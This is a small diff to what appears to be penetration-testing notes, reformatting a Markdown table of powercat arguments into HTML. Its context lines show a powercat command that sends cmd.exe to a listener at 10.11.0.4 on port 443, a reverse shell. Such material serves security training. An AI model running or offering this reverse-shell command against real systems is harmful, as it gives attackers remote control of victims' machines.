@@ -23,11 +23,7 @@ listening on [any] 443 ...
 PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe
 ```
 
-| Argument    | Description                                           |
-| ----------- | ----------------------------------------------------- |
-| `-c {IP}`   | Specifies **IP address** for connection               |
-| `-p {PORT}` | Specifies the **port** for connection                 |
-| `-e {APP}`  | Application that will be **executed** upon connection |
+<table><thead><tr><th width="146">Argument</th><th>Description</th></tr></thead><tbody><tr><td><code>-c {IP}</code></td><td>Specifies <strong>IP address</strong> for connection</td></tr><tr><td><code>-p {PORT}</code></td><td>Specifies the <strong>port</strong> for connection</td></tr><tr><td><code>-e {APP}</code></td><td>Application that will be <strong>executed</strong> upon connection</td></tr></tbody></table>
 
 The shell will be received as a PowerShell instance on the **listener**
 
